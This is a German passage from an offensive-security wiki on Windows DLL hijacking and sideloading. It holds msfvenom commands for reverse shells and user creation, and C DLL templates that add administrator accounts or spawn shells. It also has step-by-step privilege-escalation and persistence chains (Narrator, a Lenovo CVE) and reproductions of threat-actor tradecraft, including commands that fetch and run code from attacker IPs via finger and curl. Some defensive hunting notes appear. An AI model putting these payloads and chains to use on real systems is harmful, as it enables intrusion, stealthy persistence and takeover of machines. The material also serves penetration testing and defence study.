Beachte, dass du **deine Berechtigungen in einem Ordner** wie folgt überprüfen kannst:<sup>[[5]](#references)</sup>

```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```

Und **überprüfe die Berechtigungen aller Ordner innerhalb von PATH**:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Du kannst auch mit folgendem Befehl die Imports einer ausführbaren Datei und die Exports einer DLL überprüfen:

```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```

Für eine vollständige Anleitung, wie du **DLL Hijacking missbrauchen kannst, um deine Berechtigungen zu erweitern**, wenn du Schreibberechtigungen in einem **System-PATH-Ordner** hast, siehe:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Automatisierte Tools

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)prüft, ob du Schreibberechtigungen für einen Ordner innerhalb des System-PATH hast.\
Weitere interessante automatisierte Tools, um diese Schwachstelle zu finden, sind die **PowerSploit-Funktionen**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ und _Write-HijackDll._

### Beispiel

Wenn du ein ausnutzbares Szenario findest, ist es für eine erfolgreiche Ausnutzung besonders wichtig, eine DLL zu **erstellen, die mindestens alle Funktionen exportiert, die die ausführbare Datei daraus importiert**. Beachte, dass DLL Hijacking auch nützlich ist, um von einer mittleren Integritätsstufe zu einer hohen **(unter Umgehung der UAC)** zu gelangen oder von[ **hoher Integrität zu SYSTEM**](../index.html#from-high-integrity-to-system)**.** Ein Beispiel dafür, **wie du eine gültige DLL erstellst**, findest du in dieser Studie zu DLL Hijacking für die Ausführung: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Außerdem findest du im **nächsten Abschnitt** einige **grundlegende DLL-Codes**, die als **Vorlagen** oder zum Erstellen einer **DLL mit nicht erforderlichen exportierten Funktionen** nützlich sein können.

## **DLLs erstellen und kompilieren**

### **DLL Proxifying**

Ein **DLL-Proxy** ist im Grunde eine DLL, die beim Laden **deinen schädlichen Code ausführen**, aber auch **die Funktionen bereitstellen** und sich wie **erwartet verhalten** kann, indem sie **alle Aufrufe an die echte Bibliothek weiterleitet**.

Mit dem Tool [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) oder [**Spartacus**](https://github.com/Accenture/Spartacus) kannst du eine ausführbare Datei angeben und die Bibliothek auswählen, für die du einen Proxy erstellen möchtest, um eine **Proxy-DLL zu generieren**. Alternativ kannst du die DLL angeben und eine **Proxy-DLL generieren**.

### **Meterpreter**

**Get rev shell (x64):**

```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**Einen Meterpreter (x86) erhalten:**

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**Benutzer erstellen (x86, ich habe keine x64-Version gesehen):**

```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```

### Deine eigene

In vielen Fällen muss die DLL, die du kompilierst, **jede Funktion exportieren, die der Opferprozess importiert**. Fehlt ein erforderlicher Export, kann das Binary ihn nicht auflösen und der Exploit schlägt fehl.

<details>
<summary>C-DLL-Vorlage (Win10)</summary>

```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    switch(dwReason){
        case DLL_PROCESS_ATTACH:
            system("whoami > C:\\users\\username\\whoami.txt");
            WinExec("calc.exe", 0); //This doesn't accept redirections like system
            break;
        case DLL_PROCESS_DETACH:
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
    }
    return TRUE;
}
```

</details>

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    if (dwReason == DLL_PROCESS_ATTACH){
        system("cmd.exe /k net localgroup administrators user /add");
        ExitProcess(0);
    }
    return TRUE;
}
```

<details>
<summary>C++ DLL-Beispiel mit Benutzererstellung</summary>

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
  WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
  exit(0);
  return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
  owned();
  return 0;
}
```

</details>

<details>
<summary>Alternative C-DLL mit Thread-Einstiegspunkt</summary>

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
    system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call){
        case DLL_PROCESS_ATTACH:
            CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
            break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DEATCH:
            break;
    }
    return TRUE;
}
```

</details>

## Fallstudie: Narrator OneCore TTS Localization DLL Hijack (Barrierefreiheit/ATs)

Windows Narrator.exe prüft beim Start weiterhin eine vorhersehbare, sprachspezifische Localization DLL, die für beliebige Codeausführung und Persistenz missbraucht werden kann.<sup>[[7]](#references)</sup>

Wichtige Fakten
- Prüfpfad (aktuelle Builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Legacy-Pfad (ältere Builds): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Existiert eine beschreibbare, vom Angreifer kontrollierte DLL am OneCore-Pfad, wird sie geladen und `DllMain(DLL_PROCESS_ATTACH)` ausgeführt. Exports sind nicht erforderlich.

Erkennung mit Procmon
- Filter: `Process Name is Narrator.exe` und `Operation is Load Image` oder `CreateFile`.
- Narrator starten und den versuchten Ladevorgang des oben genannten Pfads beobachten.

Minimale DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    // Optional OPSEC: DisableThreadLibraryCalls(h);
    // Suspend/quiet Narrator main thread, then run payload
    // (see PoC for implementation details)
  }
  return TRUE;
}
```

OPSEC-Stille
- Ein naiver Hijack macht sich bemerkbar und hebt die UI hervor. Um unauffällig zu bleiben, enumeriere beim Attach die Narrator-Threads, öffne den Hauptthread (`OpenThread(THREAD_SUSPEND_RESUME)`) und suspendiere ihn mit `SuspendThread`; arbeite in deinem eigenen Thread weiter. Den vollständigen Code findest du im PoC.<sup>[[8]](#references)</sup>

Trigger und Persistenz über die Accessibility-Konfiguration
- Benutzerkontext (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Mit der obigen Konfiguration lädt der Start von Narrator die platzierte DLL. Drücke auf dem Secure Desktop (Anmeldebildschirm) CTRL+WIN+ENTER, um Narrator zu starten; deine DLL wird als SYSTEM auf dem Secure Desktop ausgeführt.

Durch RDP ausgelöste SYSTEM-Ausführung (laterale Bewegung)
- Klassische RDP-Sicherheitsebene zulassen: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Verbinde dich per RDP mit dem Host und drücke am Anmeldebildschirm CTRL+WIN+ENTER, um Narrator zu starten; deine DLL wird als SYSTEM auf dem Secure Desktop ausgeführt.
- Die Ausführung endet, sobald die RDP-Sitzung geschlossen wird – injiziere/migriere daher umgehend.

Bring Your Own Accessibility (BYOA)
- Du kannst einen integrierten Accessibility-Tool-(AT)-Registry-Eintrag klonen (z. B. CursorIndicator), so bearbeiten, dass er auf eine beliebige Binärdatei/DLL verweist, ihn importieren und anschließend `configuration` auf den Namen dieses AT setzen. Dadurch wird beliebige Ausführung über das Accessibility-Framework ermöglicht.

Hinweise
- Schreibzugriff auf `%windir%\System32` und Änderungen an HKLM-Werten erfordern Administratorrechte.
- Die gesamte Payload-Logik kann in `DLL_PROCESS_ATTACH` enthalten sein; Exports sind nicht erforderlich.

## Fallstudie: CVE-2025-1729 - Rechteausweitung mit TPQMAssistant.exe

Dieser Fall demonstriert **Phantom DLL Hijacking** in Lenovos TrackPoint Quick Menu (`TPQMAssistant.exe`), erfasst als **CVE-2025-1729**.<sup>[[2]](#references)[[3]](#references)</sup>

### Details zur Schwachstelle

- **Komponente**: `TPQMAssistant.exe` befindet sich unter `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Geplante Aufgabe**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` wird täglich um 9:30 Uhr im Kontext des angemeldeten Benutzers ausgeführt.
- **Verzeichnisberechtigungen**: Für `CREATOR OWNER` beschreibbar, wodurch lokale Benutzer beliebige Dateien ablegen können.
- **DLL-Suchverhalten**: Versucht zuerst, `hostfxr.dll` aus dem Arbeitsverzeichnis zu laden, und protokolliert "NAME NOT FOUND", wenn die Datei fehlt. Dies weist darauf hin, dass die lokale Verzeichnissuche Vorrang hat.

### Exploit-Implementierung

Ein Angreifer kann einen bösartigen `hostfxr.dll`-Stub im selben Verzeichnis ablegen und so die fehlende DLL ausnutzen, um Code im Kontext des Benutzers auszuführen:

```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        // Payload: display a message box (proof-of-concept)
        MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
    }
    return TRUE;
}
```

### Angriffsablauf

1. Lege als Standardbenutzer `hostfxr.dll` in `C:\ProgramData\Lenovo\TPQM\Assistant\` ab.
2. Warte, bis die geplante Aufgabe um 9:30 Uhr im Kontext des aktuellen Benutzers ausgeführt wird.
3. Wenn bei der Ausführung der Aufgabe ein Administrator angemeldet ist, wird die bösartige DLL in der Sitzung des Administrators mit mittlerer Integrität ausgeführt.
4. Verknüpfe gängige UAC-Bypass-Techniken, um von mittlerer Integrität zu SYSTEM-Rechten zu gelangen.

## Fallstudie: MSI-CustomAction-Dropper + DLL-Side-Loading über signierten Host (wsc_proxy.exe)

Threat Actors kombinieren häufig MSI-basierte Dropper mit DLL-Side-Loading, um Payloads unter einem vertrauenswürdigen, signierten Prozess auszuführen.<sup>[[10]](#references)</sup>

Überblick über die Kette
- Der Benutzer lädt eine MSI-Datei herunter. Während der GUI-Installation wird eine CustomAction unbemerkt ausgeführt (z. B. eine LaunchApplication- oder VBScript-Aktion), die aus eingebetteten Ressourcen die nächste Stufe rekonstruiert.
- Der Dropper schreibt eine legitime, signierte EXE und eine bösartige DLL in dasselbe Verzeichnis (Beispielpaar: von Avast signierte wsc_proxy.exe + vom Angreifer kontrollierte wsc.dll).
- Beim Start der signierten EXE lädt die Windows-DLL-Suchreihenfolge zuerst wsc.dll aus dem Arbeitsverzeichnis und führt so den Angreifercode unter einem signierten übergeordneten Prozess aus (ATT&CK T1574.001).

MSI-Analyse (worauf zu achten ist)
- CustomAction-Tabelle:
  - Suche nach Einträgen, die ausführbare Dateien oder VBScript starten. Verdächtiges Beispielmuster: LaunchApplication führt eine eingebettete Datei im Hintergrund aus.
  - Untersuche in Orca (Microsoft Orca.exe) die Tabellen CustomAction, InstallExecuteSequence und Binary.
- Eingebettete/aufgeteilte Payloads im MSI-CAB:
  - Administrative Extraktion: msiexec /a package.msi /qb TARGETDIR=C:\out
  - Oder lessmsi verwenden: lessmsi x package.msi C:\out
  - Suche nach mehreren kleinen Fragmenten, die von einer VBScript-CustomAction zusammengefügt und entschlüsselt werden. Häufiger Ablauf:

```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```

Praktisches Sideloading mit wsc_proxy.exe
- Lege diese beiden Dateien im selben Ordner ab:
  - wsc_proxy.exe: legitimer, signierter Host (Avast). Der Prozess versucht, wsc.dll anhand ihres Namens aus seinem Verzeichnis zu laden.
  - wsc.dll: DLL des Angreifers. Wenn keine bestimmten Exporte benötigt werden, reicht DllMain aus. Andernfalls erstelle eine Proxy-DLL und leite erforderliche Exporte an die echte Bibliothek weiter, während die Payload in DllMain ausgeführt wird.
- Erstelle eine minimale DLL-Payload:

```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
  }
  return TRUE;
}
```

- Für Exportanforderungen verwenden Sie ein Proxying-Framework (z. B. DLLirant/Spartacus), um eine Forwarding-DLL zu erstellen, die auch Ihre Payload ausführt.

- Diese Technik beruht auf der DLL-Namensauflösung durch die Host-Binärdatei. Verwendet der Host absolute Pfade oder sichere Ladeflags (z. B. LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), kann der Hijack fehlschlagen.
- KnownDLLs, SxS und weitergeleitete Exports können die Priorität beeinflussen und müssen bei der Auswahl der Host-Binärdatei und des Export-Sets berücksichtigt werden.

## Signierte Triaden + verschlüsselte Payloads (Fallstudie ShadowPad)

Check Point beschrieb, wie Ink Dragon ShadowPad mithilfe einer **Drei-Dateien-Triade** einsetzt, die sich in legitime Software einfügt und gleichzeitig die Kern-Payload auf dem Datenträger verschlüsselt hält:<sup>[[12]](#references)</sup>

1. **Signierte Host-EXE** – Anbieter wie AMD, Realtek oder NVIDIA werden missbraucht (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Die Angreifer benennen die ausführbare Datei um, sodass sie wie eine Windows-Binärdatei aussieht (zum Beispiel `conhost.exe`), während die Authenticode-Signatur gültig bleibt.
2. **Bösartige Loader-DLL** – wird neben der EXE unter einem erwarteten Namen abgelegt (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). Die DLL ist üblicherweise eine mit dem ScatterBrain-Framework verschleierte MFC-Binärdatei. Ihre einzige Aufgabe besteht darin, den verschlüsselten Blob zu finden, ihn zu entschlüsseln und ShadowPad reflektiv zu laden.
3. **Verschlüsselter Payload-Blob** – wird oft im selben Verzeichnis als `<name>.tmp` gespeichert. Nachdem die entschlüsselte Payload in den Speicher geladen wurde, löscht der Loader die TMP-Datei, um forensische Spuren zu beseitigen.

Hinweise zur Vorgehensweise:

* Durch Umbenennen der signierten EXE (wobei der ursprüngliche `OriginalFileName` im PE-Header erhalten bleibt) kann sie sich als Windows-Binärdatei ausgeben und zugleich die Anbietersignatur behalten. Übernehmen Sie daher Ink Dragons Vorgehensweise, `conhost.exe`-ähnliche Binärdateien abzulegen, bei denen es sich in Wirklichkeit um AMD-/NVIDIA-Dienstprogramme handelt.
* Da die ausführbare Datei vertrauenswürdig bleibt, muss bei den meisten Allowlisting-Kontrollen lediglich Ihre bösartige DLL daneben liegen. Konzentrieren Sie sich auf die Anpassung der Loader-DLL; der signierte übergeordnete Prozess kann in der Regel unverändert ausgeführt werden.
* ShadowPads Decryptor erwartet, dass sich der TMP-Blob neben dem Loader befindet und beschreibbar ist, damit er die Datei nach dem Laden in den Speicher mit Nullen überschreiben kann. Lassen Sie das Verzeichnis beschreibbar, bis die Payload geladen ist. Sobald sie sich im Speicher befindet, kann die TMP-Datei aus OPSEC-Gründen gefahrlos gelöscht werden.

### LOLBAS-Stager + Sideloading-Kette mit gestaffeltem Archiv (Finger → tar/curl → WMI)

Operatoren kombinieren DLL-Sideloading mit LOLBAS, sodass das einzige eigens erstellte Artefakt auf dem Datenträger die bösartige DLL neben der vertrauenswürdigen EXE ist:<sup>[[1]](#references)</sup>

- **Remote-Befehlsloader (Finger):** Verstecktes PowerShell startet `cmd.exe /c`, ruft Befehle von einem Finger-Server ab und leitet sie an `cmd` weiter:

  ```powershell
  powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
  ```
  - `finger user@host` ruft TCP/79-Text ab; `| cmd` führt die Serverantwort aus, sodass Operatoren den Second-Stage-Server serverseitig wechseln können.

- **Integrierter Download und Entpacken:** Lade ein Archiv mit einer harmlosen Dateiendung herunter, entpacke es und stage das Sideload-Ziel samt DLL in einem zufällig benannten Ordner unter `%LocalAppData%`:

  ```powershell
  $base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
  ```
  - `curl -s -L` blendet den Fortschritt aus und folgt Weiterleitungen; `tar -xf` verwendet das in Windows integrierte tar.

- **WMI/CIM-Start:** Starte die EXE über WMI, damit die Telemetrie einen von CIM erstellten Prozess anzeigt, während dieser die danebenliegende DLL lädt:

  ```powershell
  Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
  ```
  - Funktioniert mit Binärdateien, die lokale DLLs bevorzugen (z. B. `intelbq.exe`, `nearby_share.exe`); die Payload (z. B. Remcos) wird unter dem vertrauenswürdigen Namen ausgeführt.

- **Hunting:** Auf `forfiles` alarmieren, wenn `/p`, `/m` und `/c` gemeinsam auftreten; außerhalb von Admin-Skripten ist das ungewöhnlich.


## Fallstudie: NSIS-Dropper + Bitdefender Submission Wizard Sideload (Chrysalis)

Bei einem jüngsten Einbruch von Lotus Blossom wurde eine vertrauenswürdige Update-Kette missbraucht, um einen mit NSIS gepackten Dropper zu verbreiten, der einen DLL-Sideload sowie vollständig im Arbeitsspeicher ausgeführte Payloads bereitstellte.<sup>[[13]](#references)</sup>

Ablauf der Tradecraft
- `update.exe` (NSIS) erstellt `%AppData%\Bluetooth`, markiert den Ordner als **HIDDEN**, legt eine umbenannte Bitdefender Submission Wizard `BluetoothService.exe`, eine bösartige `log.dll` und einen verschlüsselten Blob `BluetoothService` ab und startet anschließend die EXE.
- Die Host-EXE importiert `log.dll` und ruft `LogInit`/`LogWrite` auf. `LogInit` lädt den Blob mit mmap; `LogWrite` entschlüsselt ihn mit einem benutzerdefinierten LCG-basierten Stream (Konstanten **0x19660D** / **0x3C6EF35F**, Schlüsselmaterial aus einem vorherigen Hash abgeleitet), überschreibt den Puffer mit Shellcode im Klartext, gibt temporäre Daten frei und springt zu diesem.
- Um eine IAT zu vermeiden, löst der Loader APIs auf, indem er Exportnamen mit **FNV-1a-Basis 0x811C9DC5 + Primzahl 0x1000193** hasht, anschließend einen Murmur-artigen Avalanche (**0x85EBCA6B**) anwendet und die Ergebnisse mit gesalzenen Ziel-Hashes vergleicht.

Haupt-Shellcode (Chrysalis)
- Entschlüsselt ein PE-ähnliches Hauptmodul, indem er in fünf Durchläufen wiederholt Addition/XOR/Subtraktion mit dem Schlüssel `gQ2JR&9;` ausführt, und lädt dann dynamisch `Kernel32.dll` → `GetProcAddress`, um die Auflösung der Imports abzuschließen.
- Rekonstruiert DLL-Namenszeichenfolgen zur Laufzeit mithilfe von Bit-Rotate/XOR-Transformationen pro Zeichen und lädt anschließend `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Verwendet einen zweiten Resolver, der die **PEB → InMemoryOrderModuleList** durchläuft, jede Exporttabelle in 4-Byte-Blöcken mit Murmur-artigem Mixing parst und nur dann auf `GetProcAddress` zurückgreift, wenn der Hash nicht gefunden wird.

Eingebettete Konfiguration & C2
- Die Konfiguration befindet sich in der abgelegten Datei `BluetoothService` bei **Offset 0x30808** (Größe **0x980**) und wird mit dem RC4-Schlüssel `qwhvb^435h&*7` entschlüsselt, wodurch die C2-URL und der User-Agent sichtbar werden.
- Beacons erstellen ein durch Punkte getrenntes Host-Profil, stellen das Tag `4Q` voran und verschlüsseln es anschließend mit dem RC4-Schlüssel `vAuig34%^325hGV`, bevor sie es über HTTPS an `HttpSendRequestA` senden. Antworten werden mit RC4 entschlüsselt und anhand eines Tag-Switches verarbeitet (`4T` Shell, `4V` Prozessausführung, `4W/4X` Dateischreiben, `4Y` Lesen/Exfiltration, `4\\` Deinstallation, `4` Laufwerks-/Dateiaufzählung + Fälle für die blockweise Übertragung).
- Der Ausführungsmodus wird durch CLI-Argumente gesteuert: keine Argumente = Persistenz installieren (Dienst/Run-Schlüssel), der auf `-i` verweist; `-i` startet sich selbst mit `-k` erneut; `-k` überspringt die Installation und führt die Payload aus.

Beobachteter alternativer Loader
- Bei demselben Einbruch wurde Tiny C Compiler abgelegt und `svchost.exe -nostdlib -run conf.c` aus `C:\ProgramData\USOShared\` ausgeführt; `libtcc.dll` lag daneben. Der vom Angreifer bereitgestellte C-Quellcode enthielt Shellcode, wurde kompiliert und im Arbeitsspeicher ausgeführt, ohne eine PE-Datei auf der Festplatte abzulegen. Reproduzieren Sie dies mit:

```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```

- Diese TCC-basierte Compile-and-Run-Phase importierte `Wininet.dll` zur Laufzeit und lud Shellcode der zweiten Stufe von einer fest codierten URL herunter. So entstand ein flexibler Loader, der sich als Compilerlauf tarnt.

## DLL-Sideloading mit Export-Proxying und Host-Thread-Parking

Einige DLL-Sideloading-Ketten ergänzen **Stabilitätsmaßnahmen**, damit der legitime Host lange genug aktiv bleibt, um spätere Stufen sauber zu laden, statt nach dem Laden der bösartigen DLL abzustürzen.<sup>[[11]](#references)</sup>

Beobachtetes Muster
- Eine vertrauenswürdige EXE zusammen mit einer bösartigen DLL unter dem erwarteten Abhängigkeitsnamen ablegen, etwa `version.dll`.
- Die bösartige DLL **proxyt alle erwarteten Exporte** an die echte System-DLL weiter (zum Beispiel `%SystemRoot%\\System32\\version.dll`), damit die Importauflösung weiterhin funktioniert und der Hostprozess weiterläuft.
- Nach dem Laden patcht die bösartige DLL **den Einstiegspunkt des Hosts**, sodass der Hauptthread in eine Endlosschleife mit `Sleep` gerät, anstatt den Prozess zu beenden oder Codepfade auszuführen, die ihn terminieren würden.
- Ein neuer Thread führt die eigentliche bösartige Arbeit aus: Er entschlüsselt den Namen oder Pfad der DLL der nächsten Stufe (RC4/XOR sind gängig) und startet sie anschließend mit `LoadLibrary`.

Warum das wichtig ist
- Normales DLL-Proxying erhält die API-Kompatibilität, garantiert aber nicht, dass der Host lange genug aktiv bleibt, um spätere Stufen auszuführen.
- Den Hauptthread mit `Sleep(INFINITE)` in einer Warteschleife zu halten, ist eine einfache Möglichkeit, den signierten Prozess aktiv zu halten, während der Loader in einem Worker-Thread Entschlüsselung, Staging oder Netzwerk-Bootstrap ausführt.
- Wer nur nach einem verdächtigen `DllMain` sucht, übersieht dieses Muster, wenn das interessante Verhalten erst nach dem Patchen des Host-Einstiegspunkts und dem Start eines sekundären Threads auftritt.

Minimaler Ablauf
1. Die signierte Host-EXE kopieren und ermitteln, welche DLL sie aus dem lokalen Verzeichnis lädt.
2. Eine Proxy-DLL erstellen, die dieselben Funktionen exportiert und an die legitime DLL weiterleitet.
3. In `DllMain(DLL_PROCESS_ATTACH)` einen Worker-Thread erstellen.
4. Von diesem Thread aus den Host-Einstiegspunkt oder die Startfunktion des Hauptthreads so patchen, dass dieser in einer `Sleep`-Schleife läuft.
5. Den Namen oder die Konfiguration der DLL der nächsten Stufe entschlüsseln und `LoadLibrary` aufrufen oder die Payload manuell mappen.

Ansatzpunkte für die Abwehr
- Signierte Prozesse, die `version.dll` oder ähnlich häufige Bibliotheken aus ihrem eigenen Anwendungsverzeichnis statt aus `System32` laden.
- Speicherpatches am Prozesseinstiegspunkt kurz nach dem Laden des Images, insbesondere Sprünge/Aufrufe, die zu `Sleep`/`SleepEx` umgeleitet werden.
- Von einer Proxy-DLL erstellte Threads, die unmittelbar `LoadLibrary` mit einer DLL mit entschlüsseltem Namen aufrufen.
- Proxy-DLLs mit vollständigem Exportsatz, die neben Hersteller-Executables in beschreibbaren Staging-Verzeichnissen wie `ProgramData`, `%TEMP%` oder entpackten Archivpfaden abgelegt werden.

## References

- [1] [Red Canary – Intelligence Insights: Januar 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [2] [CVE-2025-1729 – Rechteausweitung mit TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [3] [Microsoft Store – TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [4] [Pranay Bafna – TCAPT: DLL-Hijacking](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [5] [cocomelonc – DLL-Hijacking in Windows: Einfaches C-Beispiel](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [6] [Check Point Research – Nimbus Manticore setzt neue Malware gegen Europa ein](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [7] [TrustedSec – Hack-cessibility: Wenn DLL-Hijacks auf Windows-Hilfsprogramme treffen](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [8] [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [9] [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [10] [Unit 42 – Digitale Doppelgänger: Anatomie sich entwickelnder Impersonation-Kampagnen, die Gh0st RAT verbreiten](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [11] [Unit 42 – Zusammenlaufende Interessen: Analyse von Bedrohungsclustern, die eine südostasiatische Regierung ins Visier nehmen](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [12] [Check Point Research – Einblick in Ink Dragon: Das Relay-Netzwerk und die internen Abläufe einer verdeckten Offensivoperation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [13] [Rapid7 – Die Chrysalis-Backdoor: Ein tiefer Einblick in das Toolkit von Lotus Blossom](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [14] [0xdf – HTB Bruno: ZipSlip-zu-DLL-Hijack-Kette](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [15] [Unit 42 – Verfolgung der Spionagekampagnen von Screening Serpens, einer iranischen APT, im Jahr 2026](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
- [16] [Microsoft Learn – Element `<appDomainManagerAssembly>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [17] [Microsoft Learn – Element `<appDomainManagerType>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [18] [Microsoft Learn – Element `<probing>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element)
- [19] [Microsoft Learn – Element `<bypassTrustedAppStrongNames>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/bypasstrustedappstrongnames-element)
- [20] [Microsoft Learn – Element `<publisherPolicy>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/publisherpolicy-element)
- [21] [Microsoft Learn – Element `<requiredRuntime>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
- [22] [Check Point Research – Schnell und unerbittlich: Operationen von Nimbus Manticore während des Iran-Konflikts](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [23] [Microsoft Learn – Aufgabenaktionen](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)
- [24] [MITRE ATT&CK – T1574.014 AppDomainManager](https://attack.mitre.org/techniques/T1574/014/)
- [25] [Unit 42 – CL-STA-1062 nimmt Regierungen und kritische Infrastruktur in Südostasien ins Visier](https://unit42.paloaltonetworks.com/cl-sta-1062-tinyrct-backdoor/)
- [26] [Microsoft Learn – PE-Format](https://learn.microsoft.com/en-us/windows/win32/debug/pe-format)
- [27] [FortiGuard Labs – Aufdeckung einer in legitimer Software eingebetteten SectopRAT-Variante](https://www.fortinet.com/blog/threat-research/uncovering-a-sectoprat-variant-embedded-in-legitimate-software)
{{#include ../../../banners/hacktricks-training.md}}
